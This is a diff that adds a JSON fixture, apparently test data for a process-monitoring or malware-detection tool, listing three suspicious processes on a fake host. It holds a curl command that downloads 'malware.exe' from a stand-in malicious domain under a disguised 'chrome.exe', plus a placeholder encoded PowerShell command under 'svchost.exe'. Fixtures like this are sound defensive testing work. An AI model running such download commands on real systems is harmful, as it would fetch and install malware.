@@ -1,0 +1,31 @@
+{
+    "hostname": "test-host",
+    "timestamp": 1713960000,
+    "processes": [
+      {
+        "pid": 1001,
+        "name": "chrome.exe",
+        "cmd": "curl http://malicious-domain.com/download --output malware.exe",
+        "memory": 150000000,
+        "cpu_usage": 95.0,
+        "status": "running"
+      },
+      {
+        "pid": 1002,
+        "name": "svchost.exe",
+        "cmd": "powershell -EncodedCommand veryveryverylongbase64string...",
+        "memory": 50000000,
+        "cpu_usage": 10.0,
+        "status": "sleeping"
+      },
+      {
+        "pid": 1003,
+        "name": "sysmon.exe",
+        "cmd": "python -c 'A'*201",
+        "memory": 90000000,
+        "cpu_usage": 30.0,
+        "status": "active"
+      }
+    ]
+  }
+  
